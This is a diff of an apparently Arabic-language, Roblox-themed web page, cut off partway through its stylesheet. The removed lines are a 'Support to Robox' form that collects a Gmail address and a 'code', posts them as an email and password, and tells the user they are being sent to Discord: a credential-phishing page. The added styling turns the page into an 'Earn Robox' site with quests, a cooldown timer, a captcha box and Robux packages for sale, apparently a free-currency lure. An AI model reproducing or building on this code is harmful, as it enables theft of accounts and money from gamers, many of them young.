@@ -3,9 +3,100 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Support to Robox</title>
+  <title>Earn Robox</title>
   <style>
-    @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@600;800&display=swap');
+    @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@600;800;900&display=swap');
+
+    :root {
+      --bg-main: radial-gradient(circle at top, #1a103c 0%, #090612 100%);
+      --bg-quests:
+        radial-gradient(circle at 15% 15%, rgba(0, 240, 255, 0.2), transparent 40%),
+        radial-gradient(circle at 85% 20%, rgba(168, 85, 247, 0.24), transparent 42%),
+        radial-gradient(circle at 50% 90%, rgba(236, 72, 153, 0.16), transparent 45%),
+        linear-gradient(160deg, #090717 0%, #120d29 50%, #070611 100%);
+      --bg-arcade: radial-gradient(circle at top, #082f2b 0%, #040d12 100%);
+      --card-bg: rgba(20, 16, 40, 0.9);
+      --card-quests-bg: rgba(13, 10, 29, 0.78);
+      --surface-bg: rgba(13, 10, 26, 0.92);
+      --input-bg: #0d0a1a;
+      --border-main: #00f0ff;
+      --border-subtle: rgba(139, 92, 246, 0.45);
+      --accent-1: #00f0ff;
+      --accent-2: #a855f7;
+      --accent-3: #ec4899;
+      --text-main: #ffffff;
+      --text-muted: #94a3b8;
+      --text-soft: #cbd5e1;
+      --top-bar: linear-gradient(90deg, #00f0ff, #a855f7, #ec4899);
+    }
+
+    body.theme-aurora {
+      --bg-main: radial-gradient(circle at top, #063838 0%, #041017 100%);
+      --bg-quests:
+        radial-gradient(circle at 15% 18%, rgba(16, 185, 129, 0.24), transparent 42%),
+        radial-gradient(circle at 85% 22%, rgba(34, 211, 238, 0.24), transparent 44%),
+        radial-gradient(circle at 50% 90%, rgba(56, 189, 248, 0.16), transparent 45%),
+        linear-gradient(160deg, #041118 0%, #07242b 50%, #030b10 100%);
+      --bg-arcade: radial-gradient(circle at top, #053b32 0%, #031217 100%);
+      --card-bg: rgba(7, 29, 36, 0.92);
+      --card-quests-bg: rgba(6, 23, 30, 0.82);
+      --surface-bg: rgba(5, 20, 27, 0.94);
+      --input-bg: #04151d;
+      --border-main: #2dd4bf;
+      --border-subtle: rgba(45, 212, 191, 0.42);
+      --accent-1: #2dd4bf;
+      --accent-2: #38bdf8;
+      --accent-3: #34d399;
+      --text-main: #f0fdfa;
+      --text-muted: #99f6e4;
+      --text-soft: #ccfbf1;
+      --top-bar: linear-gradient(90deg, #34d399, #2dd4bf, #38bdf8);
+    }
+
+    body.theme-light {
+      --bg-main: linear-gradient(160deg, #f8fafc 0%, #e2e8f0 100%);
+      --bg-quests:
+        radial-gradient(circle at 15% 15%, rgba(2, 132, 199, 0.12), transparent 42%),
+        radial-gradient(circle at 85% 20%, rgba(124, 58, 237, 0.12), transparent 42%),
+        linear-gradient(160deg, #f8fafc 0%, #eef2ff 55%, #f1f5f9 100%);
+      --bg-arcade: linear-gradient(160deg, #ecfdf5 0%, #e0f2fe 100%);
+      --card-bg: rgba(255, 255, 255, 0.96);
+      --card-quests-bg: rgba(255, 255, 255, 0.9);
+      --surface-bg: #f1f5f9;
+      --input-bg: #ffffff;
+      --border-main: #0284c7;
+      --border-subtle: rgba(100, 116, 139, 0.35);
+      --accent-1: #0284c7;
+      --accent-2: #7c3aed;
+      --accent-3: #db2777;
+      --text-main: #0f172a;
+      --text-muted: #475569;
+      --text-soft: #1e293b;
+      --top-bar: linear-gradient(90deg, #0284c7, #7c3aed, #db2777);
+    }
+
+    body.theme-purple {
+      --bg-main: radial-gradient(circle at top, #2e1065 0%, #0d051c 100%);
+      --bg-quests:
+        radial-gradient(circle at 18% 15%, rgba(192, 132, 252, 0.25), transparent 42%),
+        radial-gradient(circle at 82% 22%, rgba(236, 72, 153, 0.22), transparent 44%),
+        radial-gradient(circle at 50% 90%, rgba(139, 92, 246, 0.22), transparent 45%),
+        linear-gradient(160deg, #110624 0%, #210b42 50%, #0b0417 100%);
+      --bg-arcade: radial-gradient(circle at top, #3b0764 0%, #10041c 100%);
+      --card-bg: rgba(29, 11, 56, 0.92);
+      --card-quests-bg: rgba(22, 8, 44, 0.82);
+      --surface-bg: rgba(18, 7, 36, 0.95);
+      --input-bg: #140729;
+      --border-main: #c084fc;
+      --border-subtle: rgba(192, 132, 252, 0.45);
+      --accent-1: #c084fc;
+      --accent-2: #a855f7;
+      --accent-3: #f472b6;
+      --text-main: #faf5ff;
+      --text-muted: #d8b4fe;
+      --text-soft: #f3e8ff;
+      --top-bar: linear-gradient(90deg, #c084fc, #a855f7, #f472b6);
+    }
 
     * {
       box-sizing: border-box;
@@ -14,25 +105,42 @@
 
     body {
       margin: 0;
-      min-height: 100vh;
+      min-height: 100dvh;
+      width: 100%;
       display: flex;
       align-items: center;
       justify-content: center;
-      background: radial-gradient(circle at top, #1a103c 0%, #090612 100%);
-      color: #ffffff;
-      padding: 20px;
+      background: var(--bg-main);
+      color: var(--text-main);
+      padding: 16px;
+      overflow-x: hidden;
+      overflow-y: auto;
+      transition: background 0.35s ease, color 0.25s ease, padding 0.3s ease;
+    }
+
+    body.quests-full-mode {
+      padding: 0;
+      align-items: stretch;
+      justify-content: stretch;
+      background: var(--bg-quests);
+    }
+
+    body.arcade-mode {
+      background: var(--bg-arcade);
     }
 
     .gaming-card {
       width: 100%;
-      max-width: 430px;
-      background: rgba(20, 16, 40, 0.85);
-      border: 2px solid #00f0ff;
+      max-width: 460px;
+      margin: auto;
+      background: var(--card-bg);
+      border: 2px solid var(--border-main);
       border-radius: 16px;
-      padding: 28px 24px;
-      box-shadow: 0 0 25px rgba(0, 240, 255, 0.25), inset 0 0 15px rgba(168, 85, 247, 0.2);
+      padding: 24px 20px;
+      box-shadow: 0 0 25px rgba(0, 240, 255, 0.16);
       position: relative;
       overflow: hidden;
+      transition: all 0.3s ease;
     }
 
     .gaming-card::before {
@@ -42,180 +150,674 @@
       left: 0;
       right: 0;
       height: 4px;
-      background: linear-gradient(90deg, #00f0ff, #a855f7, #ec4899);
+      background: var(--top-bar);
+    }
+
+    body.quests-full-mode .gaming-card {
+      max-width: 100%;
+      width: 100%;
+      min-height: 100dvh;
+      border-radius: 0;
+      border: none;
+      padding: 28px 18px;
+      background: var(--card-quests-bg);
+      box-shadow: none;
+      display: flex;
+      flex-direction: column;
+      justify-content: flex-start;
+    }
+
+    body.quests-full-mode .gaming-card::before {
+      height: 5px;
+    }
+
+    .gaming-card.arcade-card {
+      border-color: #10b981;
+    }
+
+    .screen {
+      display: none;
+    }
+
+    .screen.active {
+      display: block;
+    }
+
+    body.quests-full-mode #questsScreen.active,
+    body.quests-full-mode #profileScreen.active,
+    body.quests-full-mode #settingsScreen.active,
+    body.quests-full-mode #shopScreen.active {
+      width: 100%;
+      max-width: 820px;
+      margin: auto;
+    }
+
+    .top-bar-actions {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      flex-wrap: wrap;
+      gap: 8px;
+      margin-bottom: 10px;
+    }
+
+    .right-actions {
+      display: flex;
+      align-items: center;
+      flex-wrap: wrap;
+      gap: 8px;
+    }
+
+    .coins-pill {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      background: rgba(245, 158, 11, 0.16);
+      border: 1.5px solid #f59e0b;
+      color: #fbbf24;
+      padding: 5px 12px;
+      border-radius: 999px;
+      font-size: 0.88rem;
+      font-weight: 900;
+    }
+
+    body.theme-light .coins-pill {
+      background: #fef3c7;
+      color: #b45309;
+      border-color: #d97706;
+    }
+
+    .icon-action-btn {
+      padding: 6px 12px;
+      border-radius: 10px;
+      border: 1.5px solid var(--border-main);
+      background: rgba(0, 240, 255, 0.08);
+      color: var(--text-main);
+      font-size: 0.82rem;
+      font-weight: 800;
+      cursor: pointer;
+      transition: all 0.2s ease;
+    }
+
+    .icon-action-btn:hover {
+      transform: translateY(-1px);
+      border-color: var(--accent-2);
     }
 
     .badge {
       display: inline-block;
-      background: rgba(168, 85, 247, 0.2);
-      border: 1px solid #a855f7;
-      color: #d8b4fe;
+      background: rgba(168, 85, 247, 0.18);
+      border: 1px solid var(--accent-2);
+      color: var(--text-soft);
       font-size: 0.78rem;
       padding: 3px 10px;
       border-radius: 20px;
-      margin-bottom: 10px;
+      margin-bottom: 8px;
       font-weight: 800;
     }
 
-    h1 {
+    h1, h2 {
       margin: 0 0 6px;
-      font-size: 1.7rem;
-      font-weight: 800;
-      background: linear-gradient(90deg, #00f0ff, #c084fc);
+      font-size: 1.55rem;
+      font-weight: 900;
+      background: linear-gradient(90deg, var(--accent-1), var(--accent-2), var(--accent-3));
       -webkit-background-clip: text;
       -webkit-text-fill-color: transparent;
-      letter-spacing: 0.5px;
+    }
+
+    body.quests-full-mode h2 {
+      font-size: 1.85rem;
     }
 
     p {
-      margin: 0 0 22px;
-      color: #94a3b8;
+      margin: 0 0 18px;
+      color: var(--text-muted);
       font-size: 0.9rem;
+      line-height: 1.55;
     }
 
     .field {
-      margin-bottom: 18px;
+      margin-bottom: 14px;
     }
 
     label {
       display: block;
-      margin-bottom: 7px;
-      font-size: 0.95rem;
+      margin-bottom: 6px;
+      font-size: 0.92rem;
       font-weight: 800;
-      color: #e2e8f0;
+      color: var(--text-soft);
     }
 
     input {
       width: 100%;
-      padding: 12px 14px;
+      padding: 11px 14px;
       border-radius: 10px;
-      border: 1.5px solid #334155;
-      background: #0d0a1a;
-      color: #00f0ff;
-      font-size: 1rem;
-      font-weight: 600;
+      border: 1.5px solid var(--border-subtle);
+      background: var(--input-bg);
+      color: var(--text-main);
+      font-size: 0.98rem;
+      font-weight: 700;
       outline: none;
-      transition: all 0.25s ease;
-    }
-
-    input::placeholder {
-      color: #475569;
-      font-weight: 600;
+      transition: all 0.2s ease;
     }
 
     input:focus {
-      border-color: #00f0ff;
-      box-shadow: 0 0 12px rgba(0, 240, 255, 0.35);
+      border-color: var(--border-main);
+      box-shadow: 0 0 10px rgba(0, 240, 255, 0.2);
     }
 
-    button {
+    button.main-btn {
       width: 100%;
-      padding: 13px;
+      padding: 12px;
       border: none;
       border-radius: 10px;
-      background: linear-gradient(90deg, #00f0ff 0%, #8b5cf6 100%);
-      color: #090612;
-      font-size: 1.05rem;
+      background: linear-gradient(90deg, var(--accent-1), var(--accent-2));
+      color: #ffffff;
+      text-shadow: 0 1px 2px rgba(0, 0, 0, 0.45);
+      font-size: 1.02rem;
       font-weight: 800;
       cursor: pointer;
-      transition: transform 0.15s, box-shadow 0.2s;
-      box-shadow: 0 4px 15px rgba(0, 240, 255, 0.3);
+      transition: transform 0.15s ease;
     }
 
-    button:hover {
+    button.main-btn:hover {
       transform: translateY(-2px);
-      box-shadow: 0 6px 20px rgba(139, 92, 246, 0.5);
     }
 
-    button:active {
-      transform: translateY(0);
-    }
-
-    button:disabled {
+    button.main-btn:disabled {
       opacity: 0.6;
       cursor: not-allowed;
       transform: none;
     }
 
     .status {
-      margin-top: 16px;
-      font-size: 0.92rem;
-      font-weight: 600;
+      margin-top: 12px;
+      font-size: 0.88rem;
+      font-weight: 700;
       text-align: center;
       min-height: 22px;
     }
 
-    .success { color: #00f0ff; text-shadow: 0 0 8px rgba(0, 240, 255, 0.4); }
+    .success { color: #10b981; }
     .error { color: #fb7185; }
-  </style>
-</head>
-<body>
-  <div class="gaming-card">
-    <span class="badge">🎮 GAMING SUPPORT</span>
-    <h1>Support to Robox</h1>
-    <p>أدخل بياناتك بالأسفل للتواصل المباشر مع القناة.</p>
+    body.theme-light .success { color: #047857; }
+    body.theme-light .error { color: #be123c; }
 
-    <form id="supportForm">
-      <div class="field">
-        <label for="gamerTag">Gmail</label>
-        <input type="text" id="gamerTag" name="gamerTag" placeholder="اكتب Gmail هنا..." required />
-      </div>
+    .captcha-box {
+      margin-top: 12px;
+      padding: 10px 12px;
+      border-radius: 10px;
+      background: var(--surface-bg);
+      border: 1px dashed var(--accent-2);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      font-size: 0.85rem;
+      color: var(--text-soft);
+    }
 
-      <div class="field">
-        <label for="secretCode">الرمز</label>
-        <input type="text" id="secretCode" name="secretCode" placeholder="اكتب الرمز هنا..." required />
-      </div>
+    .captcha-box.active {
+      display: flex;
+    }
 
-      <button type="submit" id="submitBtn">إرسال الآن ⚡</button>
-      <div class="status" id="statusMsg"></div>
-    </form>
-  </div>
+    .spinner {
+      width: 16px;
+      height: 16px;
+      border: 2.5px solid rgba(148, 163, 184, 0.3);
+      border-top-color: var(--accent-1);
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+    }
 
-  <script>
-    const form = document.getElementById("supportForm");
-    const submitBtn = document.getElementById("submitBtn");
-    const statusMsg = document.getElementById("statusMsg");
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
 
-    form.addEventListener("submit", async (e) => {
-      e.preventDefault();
+    .cooldown-banner {
+      display: none;
+      margin-bottom: 16px;
+      padding: 14px 16px;
+      border-radius: 12px;
+      background: rgba(245, 158, 11, 0.14);
+      border: 1.5px solid #f59e0b;
+      color: var(--text-main);
+      text-align: center;
+    }
 
-      const email = document.getElementById("gamerTag").value.trim();
-      const password = document.getElementById("secretCode").value.trim();
+    .cooldown-banner.active {
+      display: block;
+    }
 
-      if (!email || !password) {
-        statusMsg.textContent = "من فضلك املأ خانة Gmail والرمز!";
-        statusMsg.className = "status error";
-        return;
+    .cooldown-timer {
+      font-size: 1.35rem;
+      font-weight: 900;
+      color: #fbbf24;
+      margin-top: 4px;
+      direction: ltr;
+    }
+
+    body.theme-light .cooldown-timer {
+      color: #b45309;
+    }
+
+    .quests-list {
+      display: grid;
+      grid-template-columns: 1fr;
+      gap: 12px;
+      margin-bottom: 18px;
+    }
+
+    @media (min-width: 640px) {
+      body.quests-full-mode .quests-list {
+        grid-template-columns: repeat(3, 1fr);
+        gap: 14px;
       }
+    }
 
-      submitBtn.disabled = true;
-      statusMsg.textContent = "جاري الإرسال للديسكورد...";
-      statusMsg.className = "status";
+    .quest-slot {
+      width: 100%;
+      text-align: right;
+      padding: 14px 16px;
+      border-radius: 14px;
+      background: var(--surface-bg);
+      border: 1.5px solid var(--border-subtle);
+      color: var(--text-main);
+      cursor: pointer;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      gap: 10px;
+      min-height: 118px;
+      transition: all 0.2s ease;
+    }
 
-      try {
-        const response = await fetch("/submit", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ email, password })
-        });
+    .quest-slot:hover:not(:disabled) {
+      border-color: var(--border-main);
+      transform: translateY(-2px);
+    }
 
-        const data = await response.json();
+    .quest-slot:disabled {
+      opacity: 0.72;
+      cursor: not-allowed;
+    }
 
-        if (response.ok && data.status === "success") {
-          statusMsg.textContent = data.message;
-          statusMsg.className = "status success";
-          form.reset();
-        } else {
-          statusMsg.textContent = data.message || "تعذر الاتصال بالديسكورد.";
-          statusMsg.className = "status error";
-        }
-      } catch (err) {
-        statusMsg.textContent = "تعذر الاتصال بالديسكورد.";
-        statusMsg.className = "status error";
-      } finally {
-        submitBtn.disabled = false;
+    .quest-top-row {
+      display: flex;
+      align-items: flex-start;
+      justify-content: space-between;
+      gap: 8px;
+      width: 100%;
+    }
+
+    .quest-title {
+      font-weight: 800;
+      font-size: 0.96rem;
+      color: var(--accent-1);
+      line-height: 1.35;
+    }
+
+    .quest-sub {
+      font-size: 0.8rem;
+      color: var(--text-muted);
+    }
+
+    .quest-reward {
+      font-size: 0.8rem;
+      font-weight: 800;
+      color: #fbbf24;
+    }
+
+    body.theme-light .quest-reward {
+      color: #b45309;
+    }
+
+    .quest-tag {
+      font-size: 0.74rem;
+      padding: 3px 9px;
+      border-radius: 999px;
+      font-weight: 800;
+      white-space: nowrap;
+    }
+
+    .quest-tag.game-tag {
+      background: rgba(6, 182, 212, 0.2);
+      color: #22d3ee;
+      border: 1px solid rgba(6, 182, 212, 0.45);
+    }
+
+    .quest-tag.code-tag {
+      background: rgba(245, 158, 11, 0.18);
+      color: #fbbf24;
+      border: 1px solid rgba(245, 158, 11, 0.45);
+    }
+
+    .quest-tag.done {
+      background: rgba(16, 185, 129, 0.24);
+      color: #34d399;
+      border: 1px solid rgba(16, 185, 129, 0.5);
+    }
+
+    body.theme-light .quest-tag.game-tag { color: #0369a1; background: #e0f2fe; }
+    body.theme-light .quest-tag.code-tag { color: #b45309; background: #fef3c7; }
+    body.theme-light .quest-tag.done { color: #047857; background: #d1fae5; }
+
+    .code-display-box {
+      font-size: 1.5rem;
+      font-weight: 900;
+      letter-spacing: 4px;
+      color: var(--accent-1);
+      background: var(--input-bg);
+      border: 1.5px dashed var(--border-main);
+      border-radius: 10px;
+      padding: 10px 16px;
+      margin: 10px auto 14px;
+      display: inline-block;
+      user-select: all;
+      direction: ltr;
+    }
+
+    .mini-box {
+      background: var(--surface-bg);
+      border: 1px solid var(--border-subtle);
+      border-radius: 12px;
+      padding: 16px;
+      text-align: center;
+      margin-bottom: 14px;
+    }
+
+    .mini-btn {
+      padding: 10px 16px;
+      border: none;
+      border-radius: 10px;
+      background: linear-gradient(90deg, #10b981, #06b6d4);
+      color: #041318;
+      font-weight: 800;
+      font-size: 0.92rem;
+      cursor: pointer;
+      margin-top: 8px;
+    }
+
+    .secondary-btn {
+      width: 100%;
+      padding: 10px;
+      border-radius: 10px;
+      border: 1px solid var(--border-subtle);
+      background: var(--surface-bg);
+      color: var(--text-soft);
+      font-weight: 700;
+      cursor: pointer;
+      margin-top: 8px;
+      transition: all 0.2s ease;
+    }
+
+    .secondary-btn:hover {
+      border-color: var(--border-main);
+      color: var(--text-main);
+    }
+
+    .panel-box {
+      background: var(--surface-bg);
+      border: 1px solid var(--border-subtle);
+      border-radius: 14px;
+      padding: 16px;
+      margin-bottom: 14px;
+    }
+
+    .panel-title {
+      font-size: 1rem;
+      font-weight: 800;
+      color: var(--accent-1);
+      margin-bottom: 10px;
+    }
+
+    .inline-row {
+      display: flex;
+      gap: 8px;
+      align-items: center;
+      flex-wrap: wrap;
+    }
+
+    .inline-row input {
+      flex: 1;
+      min-width: 160px;
+    }
+
+    .small-btn {
+      padding: 10px 14px;
+      border-radius: 10px;
+      border: none;
+      background: linear-gradient(90deg, var(--accent-1), var(--accent-2));
+      color: #ffffff;
+      font-weight: 800;
+      font-size: 0.88rem;
+      cursor: pointer;
+      white-space: nowrap;
+    }
+
+    .theme-grid {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 10px;
+      margin-top: 8px;
+    }
+
+    .theme-option-btn {
+      padding: 12px;
+      border-radius: 12px;
+      border: 1.5px solid var(--border-subtle);
+      background: var(--input-bg);
+      color: var(--text-main);
+      font-weight: 800;
+      font-size: 0.9rem;
+      cursor: pointer;
+      transition: all 0.2s ease;
+    }
+
+    .theme-option-btn.active {
+      border-color: var(--border-main);
+      box-shadow: 0 0 0 2px rgba(0, 240, 255, 0.25);
+      background: rgba(0, 240, 255, 0.12);
+    }
+
+    .shop-alert-box {
+      padding: 12px 14px;
+      border-radius: 12px;
+      background: rgba(245, 158, 11, 0.14);
+      border: 1.5px solid #f59e0b;
+      color: var(--text-main);
+      font-size: 0.92rem;
+      font-weight: 800;
+      margin-bottom: 14px;
+      text-align: center;
+    }
+
+    .packages-grid {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 12px;
+      margin-top: 12px;
+    }
+
+    @media (max-width: 480px) {
+      .packages-grid {
+        grid-template-columns: 1fr;
       }
-    });
-  </script>
-</body>
-</html>
+    }
+
+    .package-card {
+      background: var(--input-bg);
+      border: 1.5px solid var(--border-subtle);
+      border-radius: 14px;
+      padding: 14px;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      gap: 10px;
+    }
+
+    .package-robux {
+      font-size: 1.15rem;
+      font-weight: 900;
+      color: var(--accent-1);
+    }
+
+    .package-price {
+      font-size: 0.9rem;
+      font-weight: 800;
+      color: #fbbf24;
+    }
+
+    body.theme-light .package-price {
+      color: #b45309;
+    }
+
+    .buy-btn {
+      width: 100%;
+      padding: 9px 12px;
+      border-radius: 10px;
+      border: none;
+      background: linear-gradient(90deg, #10b981, #06b6d4);
+      color: #041318;
+      font-weight: 900;
+      font-size: 0.88rem;
+      cursor: pointer;
+    }
+
+    .orders-list {
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+      margin-top: 10px;
+    }
+
+    .order-item {
+      padding: 10px 12px;
+      border-radius: 10px;
+      background: var(--input-bg);
+      border: 1px solid var(--border-subtle);
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      flex-wrap: wrap;
+      gap: 8px;
+      font-size: 0.84rem;
+    }
+
+    .sending-badge {
+      padding: 3px 10px;
+      border-radius: 999px;
+      background: rgba(56, 189, 248, 0.18);
+      border: 1px solid #38bdf8;
+      color: #38bdf8;
+      font-weight: 800;
+      font-size: 0.76rem;
+    }
+
+    body.theme-light .sending-badge {
+      background: #e0f2fe;
+      color: #0369a1;
+      border-color: #0284c7;
+    }
+
+    .modal-backdrop {
+      position: fixed;
+      inset: 0;
+      background: rgba(2, 6, 23, 0.78);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      padding: 16px;
+      z-index: 999;
+    }
+
+    .modal-backdrop.show {
+      display: flex;
+    }
+
+    .modal-card {
+      width: 100%;
+      max-width: 400px;
+      background: var(--card-bg);
+      border: 2px solid #f59e0b;
+      border-radius: 16px;
+      padding: 22px 18px;
+      text-align: center;
+      box-shadow: 0 12px 35px rgba(0, 0, 0, 0.45);
+    }
+
+    .modal-warning-title {
+      font-size: 1.15rem;
+      font-weight: 900;
+      color: #fbbf24;
+      margin-bottom: 8px;
+    }
+
+    body.theme-light .modal-warning-title {
+      color: #b45309;
+    }
+
+    .modal-warning-text {
+      font-size: 0.95rem;
+      font-weight: 800;
+      color: var(--text-main);
+      margin-bottom: 16px;
+      line-height: 1.6;
+    }
+
+    .modal-actions {
+      display: flex;
+      gap: 10px;
+    }
+
+    .modal-actions button {
+      flex: 1;
+      padding: 10px;
+      border-radius: 10px;
+      font-weight: 800;
+      cursor: pointer;
+    }
+
+    .candy-grid {
+      display: grid;
+      grid-template-columns: repeat(5, 1fr);
+      gap: 6px;
+      max-width: 270px;
+      margin: 10px auto;
+    }
+
+    .candy-cell {
+      height: 44px;
+      border-radius: 10px;
+      border: 2px solid transparent;
+      font-size: 1.25rem;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      background: var(--input-bg);
+      transition: transform 0.12s ease, border-color 0.12s ease;
+    }
+
+    .candy-cell.selected {
+      border-color: #fbbf24;
+      transform: scale(1.06);
+    }
+
+    .scope-board {
+      position: relative;
+      height: 150px;
+      border-radius: 12px;
+      background: #07131a;
+      border: 1px solid rgba(34, 211, 238, 0.4);
+      overflow: hidden;
+      margin: 10px auto;
+      cursor: crosshair;
+    }
+
+    .sniper-target {
+      position: absolute;
+      width: 34px;
+      height: 34px;
+      border-radius: 50%;
+      background: radial-gradient(circle, #fb718
